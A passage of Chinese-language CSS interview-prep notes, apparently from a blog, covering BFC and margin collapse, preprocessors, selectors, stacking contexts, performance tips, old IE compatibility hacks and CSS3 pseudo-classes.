class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: lightblue;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*将其放在不同的 BFC 容器中后*/</span></span><br><span class="line"><span class="comment">/*html*/</span></span><br><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;<span class="selector-tag">p</span>&gt;&lt;/<span class="selector-tag">p</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;<span class="selector-tag">p</span>&gt;&lt;/<span class="selector-tag">p</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line"><span class="comment">/*css*/</span></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: lightblue;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. 清除浮动</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #000;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/01/wdx4yQJe5EX9nrz.jpg" alt="Snipaste_2021-07-01_11-06-18.jpg"></p><p>由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #000;overflow: hidden&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/01/6MftelV2ki9wGco.jpg" alt="Snipaste_2021-07-01_11-07-10.jpg"></p><ol start="3"><li>BFC 可以阻止元素被浮动元素覆盖，从而<strong>实现两列自适应布局</strong></li></ol><p><img src="https://i.loli.net/2021/07/01/g7Cs5z1SnMOhwfE.jpg" alt="Snipaste_2021-07-01_19-45-07.jpg"></p><p>这里第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 <strong>overflow: hidden</strong>，就会变成：</p><p><img src="https://i.loli.net/2021/07/01/PC8jTc4J5dOqHIS.jpg" alt="Snipaste_2021-07-01_19-45-44.jpg"></p><h2 id="CSS预处理器-后处理器？（高频）"><a href="#CSS预处理器-后处理器？（高频）" class="headerlink" title="CSS预处理器/后处理器？（高频）"></a>CSS预处理器/后处理器？（高频）</h2><p>预处理器（less，sass，stylus）用来预编译。增加了css代码的<strong>复用性</strong>，还有层级，mixin， 变量，循环， 函数等，具有很方便的UI组件模块化开发能力，让css更加<strong>简洁</strong>，增加适应性以及可读性，可维护性等，极大的提高工作效率。</p><p>后处理器，对CSS进行处理，并最终生成CSS的预处理器。 如： postCss，通常被视为在完成的样式表中根据css规范处理css，让其更加有效。目前最常做的是给css属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。</p><h3 id="为什么要使用它们？"><a href="#为什么要使用它们？" class="headerlink" title="为什么要使用它们？"></a>为什么要使用它们？</h3><ol><li>结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。</li><li>可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。LESS 只是在 CSS 语法上做了扩展，所以老的 CSS 代码也可以与 LESS 代码一同编译。</li></ol><h3 id="scss-和-less-说一下？"><a href="#scss-和-less-说一下？" class="headerlink" title="scss 和 less 说一下？"></a>scss 和 less 说一下？</h3><p><strong>Less：</strong>一种动态样式语言，对CSS赋予了动态语言的特性，如变量、继承、运算、函数。</p><p><strong>Sass</strong>：一种动态样式语言，Sass语法属于缩排语法，比css多出如变量、嵌套、运算、混入(Mixin)、继承、颜色处理，函数等功能，更容易阅读。</p><p><strong>Scss</strong>：Sass 3，用{}取代了原来的缩进</p><p><strong>相同点：</strong></p><p>1、混入(Mixins)——class中的class；</p><p>2、参数混入——可以传递参数的class，就像函数一样；</p><p>3、嵌套规则——Class中嵌套class，从而减少重复的代码；</p><p>4、运算——CSS中用上数学；</p><p>5、颜色功能——可以编辑颜色；</p><p>6、名字空间(namespace)——分组样式，从而可以被调用；</p><p>7、作用域——局部修改样式；</p><p>8、JavaScript 赋值——在CSS中使用JavaScript表达式赋值。</p><p><strong>不同点：</strong></p><p> 1、Less是基于JavaScript，是在客户端处理的； Sass是基于Ruby的，是在服务器端处理的。</p><p> 2、关于变量 Less用@，Sass用$。</p><h2 id="IFC-是什么？"><a href="#IFC-是什么？" class="headerlink" title="IFC 是什么？"></a>IFC 是什么？</h2><p>行级格式化上下文，它有这样的一些布局规则：</p><p>（1）行级上下文内部的盒子会在水平方向，一个接一个地放置。<br>（2）当一行不够的时候会自动切换到下一行。<br>（3）行级上下文的高度由内部最高的内联盒子的高度决定。</p><h2 id="CSS选择符有哪些？"><a href="#CSS选择符有哪些？" class="headerlink" title="CSS选择符有哪些？"></a>CSS选择符有哪些？</h2><p>常见的选择符有以下：</p><ol><li><code>id</code>选择器（<code>#content</code>）</li><li>类选择器（<code>.content</code>）,</li><li>标签选择器（<code>div</code>, <code>p</code>, <code>span</code>等）,</li><li>后代选择器（<code>li a</code>）</li><li>相邻后代选择器（子）选择器（<code>ul&gt;li</code>）</li><li>兄弟选择器（<code>li~a</code>）</li><li>相邻兄弟选择器（<code>h1+p</code>）</li><li>通配符选择器（<code>*</code>）</li><li>属性选择器（<code>a[rel = &quot;external&quot;]</code>）</li><li>伪类选择器（<code>a:hover</code>, <code>li:nth-child</code>）</li><li>伪元素选择器（<code>::before、::after</code>）</li></ol><h2 id="CSS-中哪些属性可以继承？"><a href="#CSS-中哪些属性可以继承？" class="headerlink" title="CSS 中哪些属性可以继承？"></a>CSS 中哪些属性可以继承？</h2><p>有继承性的属性：</p><p>（1）字体系列属性<br>font、font-family、font-weight、font-size、font-style、font-variant、font-stretch、font-size-adjust</p><p>（2）文本系列属性<br>text-indent、text-align、text-shadow、line-height、word-spacing、letter-spacing、<br>text-transform、direction、color</p><p>（3）表格布局属性<br>caption-side border-collapse empty-cells</p><p>（4）列表属性<br>list-style-type、list-style-image、list-style-position、list-style</p><p>（5）光标属性<br>cursor</p><p>（6）元素可见性<br>visibility</p><p>（7）还有一些不常用的</p><p>speak，page，设置嵌套引用的引号类型quotes等属性</p><p>注意：当一个属性不是继承属性时，可以使用inherit关键字指定一个属性应从父元素继承它的值，inherit关键字用于显式地指定继承性，可用于任何继承性/非继承性属性。</p><h2 id="关于伪类-LVHA-的解释"><a href="#关于伪类-LVHA-的解释" class="headerlink" title="关于伪类 LVHA 的解释?"></a>关于伪类 LVHA 的解释?</h2><p>a标签有四种状态：链接访问前、链接访问后、鼠标滑过、激活，分别对应四种伪类:link、:visited、:hover、:active；</p><p>当链接未访问过时：</p><p>（1）当鼠标滑过a链接时，满足:link和:hover两种状态，要改变a标签的颜色，就必须将:hover伪类在:link伪类后面声明；<br>（2）当鼠标点击激活a链接时，同时满足:link、:hover、:active三种状态，要显示a标签激活时的样式（:active），必须将:active声明放到:link和:hover之后。因此得出LVHA这个顺序。</p><p>当链接访问过时，情况基本同上，只不过需要将:link换成:visited。</p><p>这个顺序能不能变？可以，但也只有:link和:visited可以交换位置，因为一个链接要么访问过要么没访问过，不可能同时满足，也就不存在覆盖的问题。</p><h2 id="为什么要初始化-CSS-样式？"><a href="#为什么要初始化-CSS-样式？" class="headerlink" title="为什么要初始化 CSS 样式？"></a>为什么要初始化 CSS 样式？</h2><ul><li>因为<strong>浏览器的兼容问题</strong>，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。</li><li>初始化样式会对SEO有一定影响，力求影响最小的情况下初始化。</li></ul><p>最简单的初始化方法：<code>*&#123;padding:0;margin:0;&#125;</code> </p><p><strong>但强烈不建议？</strong>：通配符需要遍历所有的标签，大大加强了网站运行的负载，会使网站加载时间较长，因此一般大型的网站都有分层次的一套初始化样式。并不是所有标签都会有padding和margin，因此对常见的具有默认padding和margin的元素初始化即可。</p><h2 id="常见的元素隐藏方式？"><a href="#常见的元素隐藏方式？" class="headerlink" title="常见的元素隐藏方式？"></a>常见的元素隐藏方式？</h2><ol><li><code>display:none</code>：渲染树不会包含该渲染对象，因此该元素不会在页面中占据位置，也不会响应绑定的监听事件。</li><li><code>visibility:hidden</code>：元素在页面中仍占据空间，但不会响应绑定的监听事件。</li><li><code>opacity:0</code>：元素在页面中仍占据空间，并且能够响应元素绑定的监听事件。</li><li><code>position:absolute</code>：绝对定位将元素移除可视区域。</li><li><code>z-index</code> 负值。</li><li><code>transform:scale(0,0)</code>：将元素缩放为 0。这种方法下元素仍在页面中占据位置，但不会响应绑定的监听事件。</li><li><code>clip-path: polygon(0px 0px, 0px 0px, 0px 0px, 0px 0px);</code>：<code>clip-path</code>属性创造一个剪切区域，内容在该区域是可见的，而该区域之外是隐藏。</li><li>长、宽设为0。</li><li><code>overflow:hidden</code>：隐藏溢出部分</li></ol><h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><h3 id="margin-边距重叠"><a href="#margin-边距重叠" class="headerlink" title="margin 边距重叠"></a>margin 边距重叠</h3><p><a href="https://juejin.cn/post/6844903794321391623#heading-4">https://juejin.cn/post/6844903794321391623#heading-4</a></p><p>块级元素的上外边距（margin-top）与下外边距（margin-bottom）有时会合并为单个外边距，这样的现象称为“margin合并”。</p><p>产生折叠的必备条件：margin必须邻接：</p><ul><li>必须是处于常规文档流（非float和绝对定位）的块级盒子，并且处于同一个BFC当中。</li><li>没有线盒，没有空隙，没有padding和border将他们分隔开</li><li>都属于垂直方向上相邻的外边距。<ul><li>元素的margin-top与其第一个常规文档流的子元素的margin-top</li><li>元素的margin-bottom与其下一个常规文档流的兄弟元素的margin-top</li><li>height为auto的元素的margin-bottom与其最后一个常规文档流的子元素的margin-bottom</li><li>高度为0并且最小高度也为0，不包含常规文档流的子元素，并且自身没有建立新的BFC的元素的margin-top和margin-bottom</li></ul></li></ul><p><strong>margin合并的3种场景：</strong></p><p>（1）<strong>相邻兄弟元素</strong>margin合并。解决办法：设置块状格式化上下文元素（BFC）</p><p>（2）<strong>父级和第一个/最后一个子元素</strong>的margin合并。解决办法：</p><ul><li><p>对于<strong>margin-top合并</strong>，可以进行如下操作（满足一个即可）：</p><ul><li><p>父元素设置为块状格式化上下文元素；</p></li><li><p>父元素设置border-top值；</p></li><li><p>父元素设置padding-top值；</p></li><li><p>父元素和第一个子元素之间添加内联元素进行分隔。</p></li></ul></li><li><p>对于<strong>margin-bottom合并</strong>，可以进行如下操作（满足一个即可）：</p><ul><li><p>父元素设置为块状格式化上下文元素；</p></li><li><p>父元素设置border-bottom值；</p></li><li><p>父元素设置padding-bottom值；</p></li><li><p>父元素和最后一个子元素之间添加内联元素进行分隔；</p></li><li><p>父元素设置height、min-height或max-height。</p></li></ul></li></ul><p>（3）<strong>空块级元素</strong>的margin合并。解决办法：</p><ul><li>设置垂直方向的border；</li><li>设置垂直方向的padding；</li><li>里面添加内联元素；</li><li>设置height或者min-height。</li></ul><h3 id="margin-和-padding-分别适合什么场景使用？"><a href="#margin-和-padding-分别适合什么场景使用？" class="headerlink" title="margin 和 padding 分别适合什么场景使用？"></a>margin 和 padding 分别适合什么场景使用？</h3><p>margin用来隔开<strong>元素与元素</strong>的间距（布局）；padding用来隔开<strong>元素与内容</strong>的间隔。</p><p>使用margin：</p><ul><li>需要在border外侧添加空白时。</li><li>空白处不需要背景（色）时。</li><li>上下相连的两个盒子之间的空白，需要相互抵消时。如15px+20px的margin，将得到20px的空白。</li></ul><p>使用padding：</p><ul><li>需要在border内测添加空白时。</li><li>空白处需要背景（色）时。</li><li>上下相连的两个盒子之间的空白，希望等于两者之和时。如15px+20px的padding，将得到35px的空白。</li></ul><h3 id="margin-padding-百分比值的计算"><a href="#margin-padding-百分比值的计算" class="headerlink" title="margin/padding 百分比值的计算?"></a>margin/padding 百分比值的计算?</h3><p>参考自 <a href="https://segmentfault.com/a/1190000016226944">margin/padding百分比值的计算</a></p><p>在默认的水平文档流方向下，CSS margin 和 padding 属性垂直方向的百分比值都是相对于<strong>父元素宽度</strong>计算的。</p><h3 id="margin-无效的情形"><a href="#margin-无效的情形" class="headerlink" title="*margin 无效的情形"></a>*margin 无效的情形</h3><p>（1）display计算值inline的非替换元素的垂直margin是无效的。对于内联替换元素，垂直margin有效，并且没有margin合并的问题。</p><p>（2）表格中的<tr>和<td>元素或者设置display计算值是table-cell或table-row的元素的margin都是无效的。</p><p>（3）绝对定位元素非定位方位的margin值“无效”。</p><p>（4）定高容器的子元素的margin-bottom或者宽度定死的子元素的margin-right的定位“失效”。</p><h2 id="什么是层叠上下文？"><a href="#什么是层叠上下文？" class="headerlink" title="什么是层叠上下文？"></a>什么是层叠上下文？</h2><p><a href="https://juejin.cn/post/6844903781004476423#heading-4">https://juejin.cn/post/6844903781004476423#heading-4</a></p><p>层叠上下文是HTML中的一个三维的概念。有如下特性：</p><p>（1）层叠上下文的层叠水平要比普通元素高。<br>（2）可以阻断元素的混合模式。<br>（3）可以嵌套，内部层叠上下文及其所有子元素均受制于外部的“层叠上下文”。<br>（4）每个层叠上下文和兄弟元素独立，当进行层叠变化或渲染的时候，只需要考虑后代元素。<br>（5）每个层叠上下文是自成体系的，当元素发生层叠的时候，整个元素被认为是在父层叠上下文的层叠顺序中。</p><p>层叠上下文的<strong>创建</strong>：</p><p>（1）根层叠上下文指的是页面根元素，可以看成是<html>元素。</p><p>（2）对于position值为relative/absolute以及Firefox/IE浏览器（不包括Chrome浏览器）下含有position:fixed声明的定位元素，当其z-index值不是auto的时候，会创建层叠上下文。Chrome等WebKit内核浏览器下，position:fixed元素天然层叠上下文。</p><p>（3）其他一些CSS3属性，比如元素的opacity值不是1。</p><h3 id="什么是层叠水平？"><a href="#什么是层叠水平？" class="headerlink" title="什么是层叠水平？"></a>什么是层叠水平？</h3><p>层叠水平决定了同一个层叠上下文中元素在z轴上的显示顺序。所有的元素都有层叠水平，对普通元素的层叠水平探讨只局限在当前层叠上下文元素中。</p><h3 id="元素的层叠顺序？"><a href="#元素的层叠顺序？" class="headerlink" title="元素的层叠顺序？"></a>元素的层叠顺序？</h3><p>层叠顺序表示元素发生层叠时有着特定的垂直显示顺序。</p><p><img src="https://i.loli.net/2021/06/30/MgQeLrTGW65czNV.jpg" alt="Snipaste_2021-06-30_22-12-01.jpg"></p><h3 id="层叠准则？"><a href="#层叠准则？" class="headerlink" title="层叠准则？"></a>层叠准则？</h3><p>（1）谁大谁上：当具有明显的层叠水平标识的时候，如生效的z-index属性值，在同一个层叠上下文领域，层叠水平值大的那一个覆盖小的那一个。</p><p>（2）后来居上：当元素的层叠水平一致、层叠顺序相同的时候，在DOM流中处于后面的元素会覆盖前面的元素。</p><h2 id="CSS优化、提高性能的方法有哪些？"><a href="#CSS优化、提高性能的方法有哪些？" class="headerlink" title="CSS优化、提高性能的方法有哪些？"></a>CSS优化、提高性能的方法有哪些？</h2><p><strong>加载性能：</strong></p><p>（1）css压缩：将写好的css进行打包压缩，可以减少很多的体积。<br>（2）css单一样式：<code>margin-bottom:bottom;margin-left:left</code>比<code>margin</code>写全的执行效率更高。<br>（3）减少使用@import，建议使用link，因为后者在页面加载时一起加载，前者是等待页面加载完成之后再进行加载。</p><p><strong>选择器性能：</strong></p><p>（1）关键选择器。选择器的最后面的部分为关键选择器。<strong>CSS选择符是从右到左进行匹配的</strong>。当使用后代选择器的时候，浏览器会遍历所有子元素来确定是否是指定的元素；</p><p>（2）如果规则拥有ID选择器作为关键选择器，则不要为规则增加标签。过滤掉无关的规则。</p><p>（3）避免使用通配规则，只对需要用到的元素进行选择。</p><p>（4）尽量少对标签进行选择，而是用class。</p><p>（5）尽量少使用后代选择器，<strong>降低选择器的权重值</strong>。后代选择器的开销是最高的，尽量将选择器的深度降到最低，不要超过三层，更多的使用类来关联每一个标签元素。</p><p>（6）了解哪些属性是可以通过<strong>继承</strong>而来的，然后<strong>避免对这些属性重复指定规则</strong>。</p><p><strong>渲染性能：</strong></p><p>（1）慎重使用高性能属性：<strong>浮动、定位</strong>。</p><p>（2）尽量减少页面重排、重绘。</p><p>（3）去除空规则：｛｝。空规则的产生原因一般来说是为了预留样式。</p><p>（4）属性值为0时，不加单位；为浮动小数0.**时，可以省略0。</p><p>（5）标准化各种浏览器前缀：带浏览器前缀的在前，标准属性在后。</p><p>（6）不使用@import前缀，它会影响css的加载速度。</p><p>（7）css雪碧图，同一页面相近部分的小图标，减少页面的请求次数。</p><p>（8）不滥用web字体。web fonts 通常体积庞大，而且一些浏览器在下载web fonts时会阻塞页面渲染。</p><p><strong>可维护性、健壮性：</strong></p><p>（1）将具有相同属性的<strong>样式抽离</strong>出来，整合并通过class在页面中进行使用，提高css的可维护性。</p><p>（2）<strong>样式与内容分离</strong>：将css代码定义到外部css中。</p><p>如果该祖先元素是纯inline元素，则规则略复杂：</p><ul><li>假设给内联元素的前后各生成一个宽度为0的内联盒子（inline box），则这两个内联盒子的padding box外面的包围盒就是内联元素的“包含块”；</li><li>如果该内联元素被跨行分割了，那么“包含块”是未定义的，也就是CSS2.1规范并没有明确定义，浏览器自行发挥否则，“包含块”由该祖先的padding box边界形成。</li></ul><p>如果没有符合条件的祖先元素，则“包含块”是“初始包含块”。</p><h3 id="页面导入样式时，使用-link-和-import-区别？"><a href="#页面导入样式时，使用-link-和-import-区别？" class="headerlink" title="页面导入样式时，使用 link 和 @import 区别？"></a>页面导入样式时，使用 link 和 @import 区别？</h3><ol><li>link是XHTML标签，不仅可以引入 css 文件，还可以引入网站图标或者设置媒体查询；@import 是 CSS 提供的语法规则，只能用来加载 css。</li><li>link引入 css 文件，页面载入同时载入 css 文件；@import在页面<strong>完全</strong>载入之后载入 css 文件，网络较慢时一开始会没有 css 样式。</li><li>link 在浏览器中没有兼容问题；@import 在 css2.1中 提出，低版本浏览器不支持。</li><li>link 中的 css 可以被 javascript 获取进而控制 DOM，而 @import 不支持。</li></ol><h2 id="阐述一下-CSS-Sprites"><a href="#阐述一下-CSS-Sprites" class="headerlink" title="阐述一下 CSS Sprites"></a>阐述一下 CSS Sprites</h2><p>将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的background-image，background-repeat，background-position组合进行背景定位。</p><p>优点：</p><ul><li><strong>减少HTTP请求数</strong>，极大地提高页面加载速度</li><li>增加图片信息重复度，提高压缩比，<strong>减少图片大小</strong></li><li>更换风格方便，只需在一张或几张图片上修改颜色或样式即可实现</li></ul><p>缺点：</p><ul><li>图片合并麻烦</li><li>维护麻烦，修改一个图片可能需要重新布局整个图片，样式</li></ul><h2 id="内联盒模型基本概念"><a href="#内联盒模型基本概念" class="headerlink" title="内联盒模型基本概念"></a>内联盒模型基本概念</h2><p>（1）内容区域（content area）：指一种围绕文字看不见的盒子，其大小仅受字符本身特性控制，本质上是一个字符盒子。但是如图片这样的替换元素，其内容显然不是文字。因此对于这些元素，内容区域可以看成元素自身。</p><p>（2）内联盒子（inline box）。“内联盒子”不会让内容成块显示，而是排成一行，这里的“内联盒子”实际指的就是元素的“外在盒子”，用来决定元素是内联还是块级。</p><p>（3）行框盒子（line box），每一行就是一个“行框盒子”，每个“行框盒子”又是由一个一个“内联盒子”组成的。</p><p>（4）包含块（containing box），由一行行的“行框盒子”组成。</p><p>（5）幽灵空白节点：在HTML5文档声明中，内联元素的所有解析和渲染表现就如同每个行框盒子的前面有一个“空白节点”一样。这个“空白节点”永远透明，不占据任何宽度，看不见也无法通过脚本获取，但又确实存在，表现如同文本节点一样。</p><h2 id="min-width-max-width-width-覆盖规则？"><a href="#min-width-max-width-width-覆盖规则？" class="headerlink" title="min-width/max-width/width 覆盖规则？"></a>min-width/max-width/width 覆盖规则？</h2><p>（1）max-width 会覆盖 width，即使 width 是行类样式或者设置了 !important。</p><p>（2）min-width 会覆盖 max-width。</p><h2 id="简单介绍使用图片-base64-编码的优点和缺点。"><a href="#简单介绍使用图片-base64-编码的优点和缺点。" class="headerlink" title="简单介绍使用图片 base64 编码的优点和缺点。"></a>简单介绍使用图片 base64 编码的优点和缺点。</h2><p>base64编码是一种图片处理格式，通过特定的算法将图片编码成一长串字符串，在页面上显示的时候，可以用该字符串来代替图片的url属性。一般一些网站的小图标可以使用base64图片来引入。</p><p>优点：<strong>减少一个图片的HTTP请求</strong></p><p>缺点：</p><p>（1）根据base64的编码原理，编码后文件会<strong>大1/3</strong>。如果把大图片编码到html/css中，不仅会影响文件的加载速度，还会增加浏览器对html或css文件解析渲染的时间。</p><p>（2）使用base64无法直接缓存，要缓存只能缓存包含base64的文件，比如HTML或者CSS，这比直接缓存图片的效果要差很多。</p><p>（3）兼容性的问题，ie8以前的浏览器不支持。</p><h2 id="对于-hasLayout-的理解？"><a href="#对于-hasLayout-的理解？" class="headerlink" title="*对于 hasLayout 的理解？"></a>*对于 hasLayout 的理解？</h2><p>hasLayout是IE特有的一个属性。很多的IE下的css bug都与其息息相关。在IE中，一个元素要么自己对自身的内容进行计算大小和组织，要么依赖于父元素来计算尺寸和组织内容。当一个元素的hasLayout属性值为true时，它负责对自己和可能的子孙元素进行尺寸计算和定位。虽然这意味着这个元素需要花更多的代价来维护自身和里面的内容，而不是依赖于祖先元素来完成这些工作。</p><h2 id="如何去除-inline-block-元素间间距？"><a href="#如何去除-inline-block-元素间间距？" class="headerlink" title="*如何去除 inline-block 元素间间距？"></a>*如何去除 inline-block 元素间间距？</h2><ul><li>移除空格</li><li>使用margin负值</li><li>使用font-size:0</li><li>letter-spacing</li><li>word-spacing</li></ul><h2 id="浏览器兼容？"><a href="#浏览器兼容？" class="headerlink" title="*浏览器兼容？"></a>*浏览器兼容？</h2><p>（1）png24位的图片在iE6浏览器上出现背景<br>解决方案：做成PNG8，也可以引用一段脚本处理。</p><p>（2）浏览器默认的margin和padding不同<br>解决方案：加一个全局的*{margin:0;padding:0;}来统一。</p><p>（3）IE6双边距bug：在IE6下，如果对元素设置了浮动，同时又设置了margin-left或margin-right，margin值会加倍。</p><p>#box{float:left;width:10px;margin:0 0 0 10px;}</p><p>这种情况之下IE会产生20px的距离<br>解决方案：在float的标签样式控制中加入_display:inline;将其转化为行内属性。(_这个符号只有ie6会识别)</p><p>（4）渐进识别的方式，从总体中逐渐排除局部。首先，巧妙的使用”\9”这一标记，将IE游览器从所有情况中分离出来。接着，再次使用”+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.bb</span>&#123;</span><br><span class="line"><span class="attribute">background-color</span>:<span class="number">#f1ee18</span>;<span class="comment">/*所有识别*/</span></span><br><span class="line"><span class="selector-class">.background-color</span>:<span class="number">#00deff</span>\<span class="number">9</span>;<span class="comment">/*IE6、7、8识别*/</span></span><br><span class="line">+<span class="attribute">background-color</span>:<span class="number">#a200ff</span>;<span class="comment">/*IE6、7识别*/</span></span><br><span class="line">_background-<span class="attribute">color</span>:<span class="number">#1e0bd1</span>;<span class="comment">/*IE6识别*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（5）IE下，可以使用获取常规属性的方法来获取自定义属性，也可以使用getAttribute()获取自定义属性；Firefox下，只能使用getAttribute()获取自定义属性<br>解决方法：统一通过getAttribute()获取自定义属性。</p><p>（6）IE下，event对象有x、y属性，但是没有pageX、pageY属性;Firefox下，event对象有pageX、pageY属性，但是没有x、y属性。<br>解决方法：（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。</p><p>（7）Chrome中文界面下默认会将小于12px的文本强制按照12px显示<br>解决方法：</p><ul><li>可通过加入CSS属性-webkit-text-size-adjust:none;解决。但是，在chrome更新到27版本之后就不可以用了。</li><li>还可以使用-webkit-transform:scale(0.5);注意-webkit-transform:scale(0.75);收缩的是整个span的大小，这时候，必须要将span转换成块元素，可以使用display：block/inline-block/…；</li></ul><p>（8）超链接访问过后hover样式就不出现了，被点击访问过的超链接样式不再具有hover和active了<br>解决方法：改变CSS属性的排列顺序L-V-H-A</p><p>（9）怪异模式问题：漏写DTD声明，Firefox仍然会按照标准模式来解析网页，但在IE中会触发怪异模<br>式。为避免怪异模式给我们带来不必要的麻烦，最好养成书写DTD声明的好习惯。</p><h1 id="CSS3内容"><a href="#CSS3内容" class="headerlink" title="CSS3内容"></a>CSS3内容</h1><h2 id="CSS3新增伪类有那些？"><a href="#CSS3新增伪类有那些？" class="headerlink" title="CSS3新增伪类有那些？"></a>CSS3新增伪类有那些？</h2><p>（1）elem:nth-child(n)：选中父元素下的第n个子元素，并且这个<strong>子元素的标签名</strong>为elem。</p><p>（2）elem:nth-last-child(n)：同上，不过是从后开始查找。</p><p>（3）elem:last-child：选中最后一个子元素。</p><p>（4）elem:only-child：如果elem是父元素下唯一的子元素，则选中。</p><p>（5）elem:nth-of-type(n)：选中父元素下第n个elem类型元素。</p><p>（6）elem:first-of-type：选中父元素下第一个elem类型元素。</p><p>（7）elem:last-of-type：选中父元素下最后一个elem类型元素。</p><p>（8）elem:only-of-type：如果父元素下的子元素只有一个elem类型元素，则选中。</p><p>（9）elem:empty：选中不包含子元素和内容的elem类型元素。</p><p>（10）elem:target：选择当前活动的elem元素。</p><p>（11）:not(elem)：选择非elem元素的每个元素。</p><p>（12）:enabled：表单控件的禁用状态。</p><p>（13）:disabled：表单控件的禁用状态。</p><p>（14）:checked：被选中的单选框或复选框。</p><h3 id="伪类与伪元素的区别"><a href="#伪类与伪元素的区别" class="headerlink" title="伪类与伪元素的区别"></a>伪类与伪元素的区别</h3><p>css引入伪类和伪元素概念是<strong>为了格式化文档树以外的信息</strong>。也就是说，伪类和伪元素是用来修饰不在文档树中的部分，比如一句话中的第一个字母，或者是列表中的第一个元素。</p><p>伪类用于<strong>当已有的元素处于某个状态时，为其添加样式</strong>，这个状态是根据用户行为而动态变化的。比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。</p><p>伪元素用于<strong>创建一些不在文档树中的元素，并为其添加样式</strong>。它们允许我们为元素的某些部分设置样式。比如说，我们可以通过::before来在一个元素前增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在文档树中。</p><h2 id="CSS3有哪些新特性？（最好根据项目回答）（todo）"><a href="#CSS3有哪些新特性？（最好根据项目回答）（todo）" class="headerlink" title="CSS3有哪些新特性？（最好根据项目回答）（todo）"></a>CSS3有哪些新特性？（最好根据项目回答）（todo）</h2><p><a href="https://github.com/febobo/web-interview/issues/106">https://github.com/febobo/web-interview/issues/106</a></p><ul><li><strong>媒体查询<code>（@media）</code>;（important）</strong></li><li>新增各种CSS(伪类)选择器（:not(.input)：所有class不是“input”的节点）</li><li>圆角<code>（border-raduis:8px）</code>;</li><li>阴影<code>（shadow）</code>和反射<code>（reflect）</code>;</li><li>旋转<code>（rotate</code>）/缩放<code>（scale）</code>/倾斜<code>（skew）</code>/移动<code>（translate）</code>;</li><li>线性渐变<code>（gradient）</code>;</li><li><code>RGBA</code>和透明度 ;</li><li>多列布局<code>（multi-column layout）</code>;</li><li>文字特效<code>（text-shadow）</code>;</li><li>文字渲染<code>（text-decoration</code>）;</li><li><code>@font-face</code>属性;</li><li>多背景图 ;</li><li>flex</li></ul><h2 id="css3-的-all-属性"><a href="#css3-的-all-属性" class="headerlink" title="*css3 的 all 属性"></a>*css3 的 all 属性</h2><p>all属性实际上是所有CSS属性的缩写，表示所有的CSS属性都怎样怎样，但是，不包括unicode-bidi和direction<br>这两个CSS属性。支持三个CSS通用属性值，initial,inherit,unset。</p><ul><li><p>initial是初始值的意思，也就是该元素元素都除了unicode-bidi和direction以外的CSS属性都使用属性的默认初始值。</p></li><li><p>inherit是继承的意思，也就是该元素除了unicode-bidi和direction以外的CSS属性都继承父元素的属性值。</p></li><li><p>unset是取消设置的意思，也就是当前元素浏览器或用户设置的CSS忽略，然后如果是具有继承特性的CSS，如color，则使用继承值；如果是没有继承特性的CSS属性，如background-color，则使用初始值。</p></li></ul><h2 id="为什么CSS3动画性能比较好？（todo）"><a href="#为什么CSS3动画性能比较好？（todo）" class="headerlink" title="为什么CSS3动画性能比较好？（todo）"></a>为什么CSS3动画性能比较好？（todo）</h2><p><a 